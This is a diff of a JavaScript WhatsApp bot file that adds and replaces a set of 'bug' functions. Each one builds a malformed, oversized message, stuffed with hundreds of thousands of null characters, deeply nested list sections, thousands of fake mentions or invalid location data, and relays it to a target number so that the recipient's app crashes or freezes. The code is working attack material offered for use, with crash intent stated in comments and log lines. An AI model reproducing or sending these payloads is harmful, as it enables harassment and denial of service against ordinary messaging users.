@@ -168,7 +168,10 @@ const {
     convertTimestampToDate,
     getAllHTML
 } = require('./lib/function');
-
+//Peralatan 
+const nomorLaporan = '6283877636168@s.whatsapp.net';
+const bugres = `_\`Waiting Proses!...\`_`
+//~~~~~~~~~~~~~~~~~~~~~~~~~\\
 // Read Database
 const sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
 const premium = JSON.parse(fs.readFileSync('./database/premium.json'));
@@ -207,7 +210,7 @@ module.exports = Xlesy = async (Xlesy, m, chatUpdate, store, groupCache) => {
         const args = body.trim().split(/ +/).slice(1)
         const quoted = m.quoted ? m.quoted : m
         const command = isCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ''
-        const text = q = args.join(' ')
+        const text = q = args.join(" ")
         const mime = (quoted.msg || quoted).mimetype || ''
         const qmsg = (quoted.msg || quoted)
         const hari = moment.tz('Asia/Jakarta').locale('id').format('dddd');
@@ -290,280 +293,1974 @@ module.exports = Xlesy = async (Xlesy, m, chatUpdate, store, groupCache) => {
         // Set Public
         if (!Xlesy.public) {
             if (!isCreator && !m.key.fromMe) return
-        }
-        async function MSGSPAM(Pe) {
-            let Msg = {
-                viewOnceMessage: {
-                    message: {
-                        messageContextInfo: {
-                            deviceListMetadata: {},
-                            deviceListMetadataVersion: 2,
-                        },
-                        interactiveMessage: {
-                            contextInfo: {
-                                mentionedJid: ["13135550002@s.whastapp.net"],
-                                isForwarded: true,
-                                forwardingScore: 999,
-                                businessMessageForwardInfo: {
-                                    businessOwnerJid: Pe,
-                                },
-                            },
-                            body: {
-                                text: "༿༑ᜳXlesyy̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟",
-                            },
-                            nativeFlowMessage: {
-                                buttons: [{
-                                        name: "single_select",
-                                        buttonParamsJson: "",
-                                    },
-                                    {
-                                        name: "call_permission_request",
-                                        buttonParamsJson: "",
-                                    },
-                                    {
-                                        name: "mpm",
-                                        buttonParamsJson: "",
-                                    },
-                                    {
-                                        name: "mpm",
-                                        buttonParamsJson: "",
-                                    },
-                                    {
-                                        name: "mpm",
-                                        buttonParamsJson: "",
-                                    },
-                                    {
-                                        name: "mpm",
-                                        buttonParamsJson: "",
-                                    },
-                                ],
-                            },
-                        },
-                    },
+        }        
+       // function bug \\
+async function InvisibleLoadFast(target) {
+      try {
+        let message = {
+          viewOnceMessage: {
+            message: {
+              messageContextInfo: {
+                deviceListMetadata: {},
+                deviceListMetadataVersion: 2,
+              },
+              interactiveMessage: {
+                contextInfo: {
+                  mentionedJid: [target],
+                  isForwarded: true,
+                  forwardingScore: 999,
+                  businessMessageForwardInfo: {
+                    businessOwnerJid: target,
+                  },
                 },
-            };
+                body: {
+                  text: "Gxyenn" + "\u0000".repeat(900000),
+                },
+                nativeFlowMessage: {
+                  buttons: [
+                    {
+                      name: "single_select",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "call_permission_request",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "mpm",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "mpm",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "mpm",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "mpm",
+                      buttonParamsJson: "",
+                    },
+                  ],
+                },
+              },
+            },
+          },
+        };
 
-            await Xlesy.relayMessage(Pe, Msg, {
-                participant: {
-                    jid: Pe
-                },
-            })
-        }
-        async function NativeC(Pe) {
-            let NativeCore = {
-                viewOnceMessage: {
-                    message: {
-                        messageContextInfo: {
-                            deviceListMetadata: {},
-                            deviceListMetadataVersion: 2,
-                        },
-                        interactiveMessage: {
-                            contextInfo: {
-                                mentionedJid: ["13135550002@s.whatsapp.net"],
-                                isForwarded: true,
-                                forwardingScore: 999,
-                                businessMessageForwardInfo: {
-                                    businessOwnerJid: Pe,
-                                },
-                                dataSharingContext: {
-                                    showMmDisclosure: true,
-                                },
-                            },
-                            body: {
-                                title: "👑",
-                                text: "𝗥̸̷̷̷̋͜͢͜͢͠͡͡ 𝗬̸̷̷̷̋͜͢͜͢͠͡͡ 𝗖̸̷̷̷̋͜͢͜͢͠͡͡-" + "᭄".repeat(9741),
-                                description: "💌",
-                                footer: "T-Яyuichi",
-                            },
-                            nativeFlowMessage: {
-                                buttons: [{
-                                        name: "single_select",
-                                        buttonParamsJson: ""
-                                    },
-                                    {
-                                        name: "view_product",
-                                        buttonParamsJson: ""
-                                    },
-                                    {
-                                        name: "payment_method",
-                                        buttonParamsJson: ""
-                                    },
-                                    {
-                                        name: "call_permission_request",
-                                        buttonParamsJson: ""
-                                    },
-                                    {
-                                        name: "mpm",
-                                        buttonParamsJson: ""
-                                    },
-                                    {
-                                        name: "payment_info",
-                                        buttonParamsJson: ""
-                                    },
-                                ],
-                            },
-                        },
+        await Xlesy.relayMessage(target, message, {
+          participant: { jid: target },
+        });
+      } catch (err) {
+        console.log(err);
+      }
+    }
+async function InvisiPayload(target) {
+      let sections = [];
+
+      for (let i = 0; i < 100000; i++) {
+        let largeText = "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟F̷o̷r̷c̷X̷l̷e̷s̷y̷V̷I̷P̷ ⃢↯🔥";
+
+        let deepNested = {
+          title: `Super Deep Nested Section ${i}`,
+          highlight_label: `Extreme Highlight ${i}`,
+          rows: [
+            {
+              title: largeText,
+              id: `id${i}`,
+              subrows: [
+                {
+                  title: "Nested row 1",
+                  id: `nested_id1_${i}`,
+                  subsubrows: [
+                    {
+                      title: "Deep Nested row 1",
+                      id: `deep_nested_id1_${i}`,
                     },
-                },
-            };
-            await Xlesy.relayMessage(Pe, NativeCore, {
-                participant: {
-                    jid: Pe
-                },
-            });
-            console.log("Success! Crash Button Sent")
-        }
-        async function DocCursor(Pe) {
-            const stanza = [{
-                    attrs: {
-                        biz_bot: '1'
+                    {
+                      title: "Deep Nested row 2",
+                      id: `deep_nested_id2_${i}`,
                     },
-                    tag: "bot",
+                  ],
                 },
                 {
-                    attrs: {},
-                    tag: "biz",
+                  title: "Nested row 2",
+                  id: `nested_id2_${i}`,
                 },
-            ];
+              ],
+            },
+          ],
+        };
 
-            let messagePayload = {
+        sections.push(deepNested);
+      }
+
+      let listMessage = {
+        title: "Massive Menu Overflow",
+        sections: sections,
+      };
+
+      let msg = generateWAMessageFromContent(
+        target,
+        {
+          viewOnceMessage: {
+            message: {
+              messageContextInfo: {
+                deviceListMetadata: {},
+                deviceListMetadataVersion: 2,
+              },
+              interactiveMessage: proto.Message.InteractiveMessage.create({
+                contextInfo: {
+                  mentionedJid: [target],
+                  isForwarded: true,
+                  forwardingScore: 999,
+                  businessMessageForwardInfo: {
+                    businessOwnerJid: target,
+                  },
+                },
+                body: proto.Message.InteractiveMessage.Body.create({
+                  text: "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟F̷o̷r̷c̷X̷l̷e̷s̷y̷V̷I̷P̷ ⃢↯🔥",
+                }),
+                footer: proto.Message.InteractiveMessage.Footer.create({
+                  buttonParamsJson: "JSON.stringify(listMessage)",
+                }),
+                header: proto.Message.InteractiveMessage.Header.create({
+                  buttonParamsJson: "JSON.stringify(listMessage)",
+                  subtitle: "Testing Immediate Force Close",
+                  hasMediaAttachment: false, // No media to focus purely on data overload
+                }),
+                nativeFlowMessage:
+                  proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                    buttons: [
+                      {
+                        name: "single_select",
+                        buttonParamsJson: "JSON.stringify(listMessage)",
+                      },
+                      {
+                        name: "payment_method",
+                        buttonParamsJson: "{}",
+                      },
+                      {
+                        name: "call_permission_request",
+                        buttonParamsJson: "{}",
+                      },
+                      {
+                        name: "single_select",
+                        buttonParamsJson: "JSON.stringify(listMessage)",
+                      },
+                      {
+                        name: "mpm",
+                        buttonParamsJson: "JSON.stringify(listMessage)",
+                      },
+                      {
+                        name: "mpm",
+                        buttonParamsJson: "JSON.stringify(listMessage)",
+                      },
+                      {
+                        name: "mpm",
+                        buttonParamsJson: "JSON.stringify(listMessage)",
+                      },
+                      {
+                        name: "mpm",
+                        buttonParamsJson: "{}",
+                      },
+                      {
+                        name: "mpm",
+                        buttonParamsJson: "{}",
+                      },
+                      {
+                        name: "mpm",
+                        buttonParamsJson: "{}",
+                      },
+                      {
+                        name: "mpm",
+                        buttonParamsJson: "{}",
+                      },
+                      {
+                        name: "mpm",
+                        buttonParamsJson: "{}",
+                      },
+                    ],
+                  }),
+              }),
+            },
+          },
+        },
+        { userJid: target }
+      );
+
+      await Xlesy.relayMessage(target, msg.message, {
+        participant: { jid: target },
+        messageId: msg.key.id,
+      });
+    }
+    
+async function MSGSPAM1(target) {
+    let Msg = {
+      viewOnceMessage: {
+        message: {
+          messageContextInfo: {
+            deviceListMetadata: {},
+            deviceListMetadataVersion: 2,
+          },
+          interactiveMessage: {
+            contextInfo: {
+              mentionedJid: ["13135550002@s.whastapp.net"],
+              isForwarded: true,
+              forwardingScore: 999,
+              businessMessageForwardInfo: {
+                businessOwnerJid: target,
+              },
+            },
+            body: {
+              text: "kontol share lok ajg",
+            },
+            nativeFlowMessage: {
+              buttons: [
+                {
+                  name: "single_select",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "call_permission_request",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "mpm",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "mpm",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "mpm",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "mpm",
+                  buttonParamsJson: "",
+                },
+              ],
+            },
+          },
+        },
+      },
+    };
+
+    await Xlesy.relayMessage(target, Msg, {
+      participant: { jid: target },
+    })
+  }
+  async function DocFc(target) {
+const stanza = [
+{
+attrs: { biz_bot: '1' },
+tag: "bot",
+},
+{
+attrs: {},
+tag: "biz",
+},
+];
+
+let messagePayload = {
+viewOnceMessage: {
+message: {
+listResponseMessage: {
+title: "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟F̷o̷r̷c̷X̷l̷e̷s̷y̷V̷I̷P̷ ⃢↯🔥" + "ꦾ".repeat(4500),
+listType: 2,
+singleSelectReply: {
+    selectedRowId: "🔪"
+},
+contextInfo: {
+stanzaId: Xlesy.generateMessageTag(),
+participant: "0@s.whatsapp.net",
+remoteJid: "status@broadcast",
+mentionedJid: [target, "13135550002@s.whatsapp.net"],
+quotedMessage: {
+                buttonsMessage: {
+                    documentMessage: {
+                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
+                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
+                        fileLength: "9999999999999",
+                        pageCount: 3567587327,
+                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
+                        fileName: "💎⃢G҉x҉y҉e҉n҉҉n҉  ⃟F̷o̷r̷c̷X̷l̷e̷s̷y̷V̷I̷P̷ ⃢↯🔥",
+                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
+                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
+                        mediaKeyTimestamp: "1735456100",
+                        contactVcard: true,
+                        caption: "Wanna Die ? Huh !"
+                    },
+                    contentText: "I Wanna Die With You \"😮‍💨\"",
+                    footerText: "© Gxyenn",
+                    buttons: [
+                        {
+                            buttonId: "\u0000".repeat(850000),
+                            buttonText: {
+                                displayText: "XLESY VIP"
+                            },
+                            type: 1
+                        }
+                    ],
+                    headerType: 3
+                }
+},
+conversionSource: "porn",
+conversionDelaySeconds: 9999,
+forwardingScore: 999999,
+isForwarded: true,
+quotedAd: {
+advertiserName: " x ",
+mediaType: "IMAGE",
+caption: " x "
+},
+placeholderKey: {
+remoteJid: "0@s.whatsapp.net",
+fromMe: false,
+id: "ABCDEF1234567890"
+},
+expiration: -99999,
+ephemeralSettingTimestamp: Date.now(),
+entryPointConversionSource: "wangcap",
+entryPointConversionApp: "wangcap",
+actionLink: {
+url: "t.me/GxyenDev",
+buttonTitle: "trash"
+},
+disappearingMode:{
+initiator:1,
+trigger:2,
+initiatorDeviceJid: target,
+initiatedByMe:true
+},
+groupSubject: "Mahiru",
+parentGroupJid: "combine",
+trustBannerType: "unexpected",
+trustBannerAction: 99999,
+isSampled: true,
+externalAdReply: {
+title: "𑲭𑲭 Gxyenn ~ \"Dev\" ⚔️ ",
+mediaType: 2,
+renderLargerThumbnail: false,
+showAdAttribution: false,
+containsAutoReply: false,
+body: "© XLESYVIP",
+sourceUrl: "se me?",
+sourceId: "XLESYVIP",
+ctwaClid: "cta",
+ref: "ref",
+clickToWhatsappCall: true,
+automatedGreetingMessageShown: false,
+greetingMessageBody: "burst",
+ctaPayload: "cta",
+disableNudge: true,
+originalImageUrl: "trash"
+},
+featureEligibilities: {
+cannotBeReactedTo: true,
+cannotBeRanked: true,
+canRequestFeedback: true
+},
+forwardedNewsletterMessageInfo: {
+newsletterJid: "120363334736301537@newsletter",
+serverMessageId: 1,
+newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
+contentType: 3,
+accessibilityText: "crash"
+},
+statusAttributionType: 2,
+utm: {
+utmSource: "utm",
+utmCampaign: "utm2"
+}
+},
+description: "INITIATED_BY_USER"
+},
+messageContextInfo: {
+supportPayload: JSON.stringify({
+version: 2,
+is_ai_message: true,
+should_show_system_message: true,
+}),
+},
+}
+}
+}
+
+await Xlesy.relayMessage(target, messagePayload, {
+additionalNodes: stanza,
+participant: { jid : target }
+});
+console.log("")
+}
+
+async function NewIos(target, Ptcp = true) {
+Xlesy.relayMessage(
+    target,
+    {
+        extendedTextMessage: {
+            text: `𑲭𑲭💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟X̷l̷e̷s̷y̷V̷I̷P ⃢↯🔥 ${'ꦾ'.repeat(103000)} ${'@13135550002'.repeat(25000)}`,
+            contextInfo: {
+                mentionedJid: [
+                    "13135550002@s.whatsapp.net",
+                    ...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
+                ],
+                stanzaId: "1234567890ABCDEF",
+                participant: "13135550002@s.whatsapp.net",
+                quotedMessage: {
+                    callLogMesssage: {
+                        isVideo: true,
+                        callOutcome: "1",
+                        durationSecs: "0",
+                        callType: "REGULAR",
+                        participants: [
+                            {
+                                jid: "13135550002@s.whatsapp.net",
+                                callOutcome: "1"
+                            }
+                        ]
+                    }
+                },
+                remoteJid: "13135550002@s.whastapp.net",
+                conversionSource: "source_example",
+                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
+                conversionDelaySeconds: 10,
+                forwardingScore: 99999999,
+                isForwarded: true,
+                quotedAd: {
+                    advertiserName: "Example Advertiser",
+                    mediaType: "IMAGE",
+                    caption: "This is an ad caption"
+                },
+                placeholderKey: {
+                    remoteJid: "13135550002@s.whatsapp.net",
+                    fromMe: false,
+                    id: "ABCDEF1234567890"
+                },
+                expiration: 86400,
+                ephemeralSettingTimestamp: "1728090592378",
+                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
+                externalAdReply: {
+                    title: "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟X̷l̷e̷s̷y̷V̷I̷P ⃢↯🔥",
+                    body: `Ai To Crash ${'\0'.repeat(200)}`,
+                    mediaType: "VIDEO",
+                    renderLargerThumbnail: true,
+                    previewType: "VIDEO",
+                    sourceType: "x",
+                    sourceId: "x",
+                    sourceUrl: "https://www.facebook.com/WhastApp",
+                    mediaUrl: "https://www.facebook.com/WhastApp",
+                    containsAutoReply: true,
+                    showAdAttribution: true,
+                    ctwaClid: "ctwa_clid_example",
+                    ref: "ref_example"
+                },
+                entryPointConversionSource: "entry_point_source_example",
+                entryPointConversionApp: "entry_point_app_example",
+                entryPointConversionDelaySeconds: 5,
+                disappearingMode: {},
+                actionLink: {
+                    url: "https://www.facebook.com/WhatsApp"
+                },
+                groupSubject: "Example Group Subject",
+                parentGroupJid: "13135550002@g.us",
+                trustBannerType: "trust_banner_example",
+                trustBannerAction: 1,
+                isSampled: false,
+                utm: {
+                    utmSource: "utm_source_example",
+                    utmCampaign: "utm_campaign_example"
+                },
+                forwardedNewsletterMessageInfo: {
+                    newsletterJid: "13135550002@newsletter",
+                    serverMessageId: 1,
+                    newsletterName: "Meta Ai",
+                    contentType: "UPDATE",
+                    accessibilityText: "Meta Ai"
+                },
+                businessMessageForwardInfo: {
+                    businessOwnerJid: "13135550002@s.whatsapp.net"
+                },
+                smbriyuCampaignId: "smb_riyu_campaign_id_example",
+                smbServerCampaignId: "smb_server_campaign_id_example",
+                dataSharingContext: {
+                    showMmDisclosure: true
+                }
+            }
+        }
+    },
+    Ptcp
+        ? {
+              participant: {
+                  jid: target
+              }
+          }
+        : {}
+       
+);
+console.log("")
+}
+async function OverloadCursor(target, ptcp = true) {
+  const virtex = [
+    {
+      attrs: { biz_bot: "1" },
+      tag: "bot",
+    },
+    {
+      attrs: {},
+      tag: "biz",
+    },
+  ];
+  let messagePayload = {
+    viewOnceMessage: {
+      message: {
+        listResponseMessage: {
+          title:
+            "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟X̷l̷e̷s̷y̷V̷I̷P ⃢↯🔥" + "ꦽ".repeat(16999),
+          listType: 2,
+          singleSelectReply: {
+            selectedRowId: "🎭",
+          },
+          contextInfo: {
+            virtexId: Xlesy.generateMessageTag(),
+            participant: "13135550002@s.whatsapp.net",
+            mentionedJid: ["13135550002@s.whatsapp.net"],
+            quotedMessage: {
+              buttonsMessage: {
+                documentMessage: {
+                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+                  mimetype:
+                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                  fileLength: "9999999999999",
+                  pageCount: 1316134911,
+                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+                  fileName: "G҉x҉y҉e҉n҉҉n҉" + "\u0000".repeat(97770),
+                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+                  directPath:
+                    "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+                  mediaKeyTimestamp: "1726867151",
+                  contactVcard: true,
+                },
+                hasMediaAttachment: true,
+                contentText: 'Hallo"',
+                footerText: "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟X̷l̷e̷s̷y̷V̷I̷P ⃢↯🔥",
+                buttons: [
+                  {
+                    buttonId: "\u0000".repeat(170000),
+                    buttonText: {
+                      displayText: "F̷o̷r̷c̷X̷l̷e̷s̷y̷V̷I̷P̷" + "\u0000".repeat(1999),
+                    },
+                    type: 1,
+                  },
+                  {
+                    buttonId: "\u0000".repeat(220000),
+                    buttonText: {
+                      displayText: "X̷l̷e̷s̷y̷V̷I̷P̷" + "\u0000".repeat(1999),
+                    },
+                    type: 1,
+                  },
+                  {
+                    buttonId: "\u0000".repeat(220000),
+                    buttonText: {
+                      displayText: "Gxyenn official" + "\u0000".repeat(1999),
+                    },
+                    type: 1,
+                  },
+                ],
+                viewOnce: true,
+                headerType: 3,
+              },
+            },
+            conversionSource: "porn",
+            conversionDelaySeconds: 9999,
+            forwardingScore: 999999,
+            isForwarded: true,
+            quotedAd: {
+              advertiserName: " x ",
+              mediaType: "IMAGE",
+              caption: " x ",
+            },
+            placeholderKey: {
+              remoteJid: "13135550002@s.whatsapp.net",
+              fromMe: false,
+              id: "ABCDEF1234567890",
+            },
+            expiration: -99999,
+            ephemeralSettingTimestamp: Date.now(),
+            entryPointConversionSource: "❤️",
+            entryPointConversionApp: "💛",
+            actionLink: {
+              url: "t.me/GxyenDev",
+              buttonTitle: "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟X̷l̷e̷s̷y̷V̷I̷P ⃢↯🔥",
+            },
+            disappearingMode: {
+              initiator: 1,
+              trigger: 2,
+              initiatorDeviceJid: target,
+              initiatedByMe: true,
+            },
+            groupSubject: "😼",
+            parentGroupJid: "😽",
+            trustBannerType: "😾",
+            trustBannerAction: 99999,
+            isSampled: true,
+            externalAdReply: {},
+            featureEligibilities: {
+              cannotBeReactedTo: true,
+              cannotBeRanked: true,
+              canRequestFeedback: true,
+            },
+            forwardedNewsletterMessageInfo: {
+              newsletterJid: "120363274419384848@newsletter",
+              serverMessageId: 1,
+              newsletterName: `@13135550002${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
+              contentType: 3,
+              accessibilityText: "kontol",
+            },
+            statusAttributionType: 2,
+            utm: {
+              utmSource: "utm",
+              utmCampaign: "utm2",
+            },
+          },
+          description: "@13135550002".repeat(2999),
+        },
+        messageContextInfo: {
+          supportPayload: JSON.stringify({
+            version: 2,
+            is_ai_message: true,
+            should_show_system_message: true,
+          }),
+        },
+      },
+    },
+  };
+  let sections = [];
+  for (let i = 0; i < 1; i++) {
+    let largeText = "\u0000".repeat(11999);
+    let deepNested = {
+      title: `Section ${i + 1}`,
+      highlight_label: `Highlight ${i + 1}`,
+      rows: [
+        {
+          title: largeText,
+          id: `\u0000`.repeat(999),
+          subrows: [
+            {
+              title: `\u0000`.repeat(999),
+              id: `\u0000`.repeat(999),
+              subsubrows: [
+                {
+                  title: `\u0000`.repeat(999),
+                  id: `\u0000`.repeat(999),
+                },
+                {
+                  title: `\u0000`.repeat(999),
+                  id: `\u0000`.repeat(999),
+                },
+              ],
+            },
+            {
+              title: `\u0000`.repeat(999),
+              id: `\u0000`.repeat(999),
+            },
+          ],
+        },
+      ],
+    };
+    sections.push(deepNested);
+  }
+  let listMessage = {
+    title: "𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳",
+    sections: sections,
+  };
+  let msg = generateWAMessageFromContent(
+    target,
+    proto.Message.fromObject({
+      viewOnceMessage: {
+        message: {
+          messageContextInfo: {
+            deviceListMetadata: {},
+            deviceListMetadataVersion: 2,
+          },
+          interactiveMessage: proto.Message.InteractiveMessage.create({
+            contextInfo: {
+              participant: "0@s.whatsapp.net",
+              remoteJid: "status@broadcast",
+              mentionedJid: [target],
+              isForwarded: true,
+              forwardingScore: 999,
+            },
+            body: proto.Message.InteractiveMessage.Body.create({
+              text: '💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟X̷l̷e̷s̷y̷V̷I̷P ⃢↯🔥' + "ꦽ".repeat(29999),
+            }),
+            footer: proto.Message.InteractiveMessage.Footer.create({
+              buttonParamsJson: JSON.stringify(listMessage),
+            }),
+            header: proto.Message.InteractiveMessage.Header.create({
+              buttonParamsJson: JSON.stringify(listMessage),
+              subtitle: "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟X̷l̷e̷s̷y̷V̷I̷P ⃢↯🔥" + "\u0000".repeat(9999),
+              hasMediaAttachment: false,
+            }),
+            nativeFlowMessage:
+              proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                buttons: [
+                  {
+                    name: "single_select",
+                    buttonParamsJson: "JSON.stringify(listMessage)",
+                  },
+                  {
+                    name: "call_permission_request",
+                    buttonParamsJson: "{}",
+                  },
+                  {
+                    name: "single_select",
+                    buttonParamsJson: "JSON.stringify(listMessage)",
+                  },
+                ],
+              }),
+          }),
+        },
+      },
+    }),
+    { userJid: target }
+  );
+  await Xlesy.relayMessage(target, msg.message, {
+    messageId: msg.key.id,
+    participant: { jid: target },
+  });
+  console.log(``);
+  await Xlesy.relayMessage(target, msg.message, {
+    messageId: msg.key.id,
+    participant: { jid: target },
+  });
+  await Xlesy.relayMessage(target, messagePayload, {
+    additionalNodes: virtex,
+    participant: { jid: target },
+  });
+  console.log(``);
+}
+async function invc2(target, ptcp = true) {
+     let msg = await generateWAMessageFromContent(target, {
                 viewOnceMessage: {
                     message: {
-                        listResponseMessage: {
-                            title: " Cursor-Crash⃟" + "ꦾ".repeat(4500),
-                            listType: 2,
-                            singleSelectReply: {
-                                selectedRowId: "🔪"
+                        interactiveMessage: {
+                            header: {
+                                title: "💎⃢ G҉x҉y҉e҉n҉҉n҉ ⃟X̷l̷e̷s̷y̷V̷I̷P ⃢↯🔥",
+                                hasMediaAttachment: false
                             },
-                            contextInfo: {
-                                stanzaId: Xlesy.generateMessageTag(),
-                                participant: "0@s.whatsapp.net",
-                                remoteJid: "status@broadcast",
-                                mentionedJid: [Pe, "13135550002@s.whatsapp.net"],
-                                quotedMessage: {
-                                    buttonsMessage: {
-                                        documentMessage: {
-                                            url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
-                                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                                            fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
-                                            fileLength: "9999999999999",
-                                            pageCount: 3567587327,
-                                            mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
-                                            fileName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟",
-                                            fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
-                                            directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
-                                            mediaKeyTimestamp: "1735456100",
-                                            contactVcard: true,
-                                            caption: "Wanna Die ? Huh !"
-                                        },
-                                        contentText: "I Wanna Die With You \"😮‍💨\"",
-                                        footerText: "© T-Яyuichi",
-                                        buttons: [{
-                                            buttonId: "\u0000".repeat(850000),
-                                            buttonText: {
-                                                displayText: "⩟⬦𪲁 Xlesy̸̷̷̷͡𝐗͜͢𝐒 -"
-                                            },
-                                            type: 1
-                                        }],
-                                        headerType: 3
+                            body: {
+                                text: "Crasher"
+                            },
+                            nativeFlowMessage: {
+                                messageParamsJson: "",
+                                buttons: [{
+                                        name: "single_select",
+                                        buttonParamsJson: "z"
+                                    },
+                                    {
+                                        name: "call_permission_request",
+                                        buttonParamsJson: "{}"
                                     }
+                                ]
+                            }
+                        }
+                    }
+                }
+            }, {});
+
+            await Xlesy.relayMessage(target, msg.message, {
+                messageId: msg.key.id,
+                participant: { jid: target }
+            });
+        }
+ // end function //
+  //FUNCTION ABAL ABAL  by Gxyenn 🗿
+    async function LocSystem(target) {
+            let virtex = "⿻ 🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉҉n҉ X̷l̷e̷s̷y̷V̷I̷P ⿻";
+            let memekz = Date.now();
+
+            await Xlesy.relayMessage(target, {
+                groupMentionedMessage: {
+                    message: {
+                        interactiveMessage: {
+                            header: {
+                                locationMessage: {
+                                    degreesLatitude: -999.03499999999999,
+                                    degreesLongitude: 999.03499999999999
                                 },
-                                conversionSource: "porn",
-                                conversionData: crypto.randomBytes(16),
-                                conversionDelaySeconds: 9999,
-                                forwardingScore: 999999,
-                                isForwarded: true,
-                                quotedAd: {
-                                    advertiserName: " x ",
-                                    mediaType: "IMAGE",
-                                    jpegThumbnail: null,
-                                    caption: " x "
-                                },
-                                placeholderKey: {
-                                    remoteJid: "0@s.whatsapp.net",
-                                    fromMe: false,
-                                    id: "ABCDEF1234567890"
-                                },
-                                expiration: -99999,
-                                ephemeralSettingTimestamp: Date.now(),
-                                ephemeralSharedSecret: crypto.randomBytes(16),
-                                entryPointConversionSource: "wangcap",
-                                entryPointConversionApp: "wangcap",
-                                actionLink: {
-                                    url: "t.me/tamainfinity",
-                                    buttonTitle: "trash"
-                                },
-                                disappearingMode: {
-                                    initiator: 1,
-                                    trigger: 2,
-                                    initiatorDeviceJid: Pe,
-                                    initiatedByMe: true
-                                },
-                                groupSubject: "crash",
-                                parentGroupJid: "combine",
-                                trustBannerType: "unexpected",
-                                trustBannerAction: 99999,
-                                isSampled: true,
-                                externalAdReply: {
-                                    title: "𑲭𑲭 T-Riyu ~ \"ryc\" ⚔️ ",
-                                    mediaType: 2,
-                                    renderLargerThumbnail: false,
-                                    showAdAttribution: false,
-                                    containsAutoReply: false,
-                                    body: "© T-Яyuichi",
-                                    thumbnail: null,
-                                    sourceUrl: "se me?",
-                                    sourceId: "ryc ~ broken",
-                                    ctwaClid: "cta",
-                                    ref: "ref",
-                                    clickToWhatsappCall: true,
-                                    automatedGreetingMessageShown: false,
-                                    greetingMessageBody: "burst",
-                                    ctaPayload: "cta",
-                                    disableNudge: true,
-                                    originalImageUrl: "trash"
-                                },
